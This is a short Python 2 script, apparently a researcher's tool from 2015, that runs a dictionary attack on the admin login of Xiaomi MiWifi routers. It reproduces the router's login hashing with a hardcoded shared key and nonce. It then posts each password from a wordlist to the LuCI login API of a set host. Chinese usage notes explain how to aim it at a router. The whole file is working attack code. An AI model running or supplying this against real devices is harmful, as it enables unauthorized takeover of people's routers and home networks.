#!/usr/bin/python
# -*- coding: UTF-8 -*-
"""
@author: xiaoL-pkav l@pker.in
@version: 2015/7/2 14:11
"""

from time import time
from time import sleep
from random import random
from hashlib import sha1
import requests

retry_cnt = 3
timeout = 10


def http_request_post(url, payload='', body_content_workflow=0):
    """
        payload = {'key1': 'value1', 'key2': 'value2'}
    """
    try_cnt = 0
    while True:
        try:
            if body_content_workflow == 1:
                result = requests.post(url, data=payload, stream=True, timeout=timeout)
                return result
            else:
                result = requests.post(url, data=payload, timeout=timeout)
                return result
        except Exception, e:
            try_cnt += 1
            if try_cnt >= retry_cnt:
                return False


def nonce_create():
    type_num = 0
    device_id = ''
    now_time = int(time()) * 100000
    random_num = int(random() * 10000)
    once = [str(type_num), str(device_id), str(now_time), str(random_num)]
    return '_'.join(once)


def password_create(password):
    key = 'a2ffa5c9be07488bbb04a3a47d3c5f6a'  # 通用key
    nonce = nonce_create()
    return nonce, sha1(nonce + sha1(password + key).hexdigest()).hexdigest()


def main():
    url = 'http://mymirouter.ddns.net'
    path = '/cgi-bin/luci/api/xqsystem/login'
    passwords = open('password.txt','r')
    for password in passwords.readlines():
        nonce, password = password_create(password)
        payload = {'username': 'admin',
                   'password': password,
                   'logtype': 2,
                   'nonce': nonce}
        result = http_request_post(url=url + path,payload=payload)
        if result != False:
            print result.content
        sleep(1)

if __name__ == "__main__":
    main()

"""
useage:
1、修改url地址为小米路由器MiWifi地址。
2、添加字典文件password.txt
3、开启脚本
"""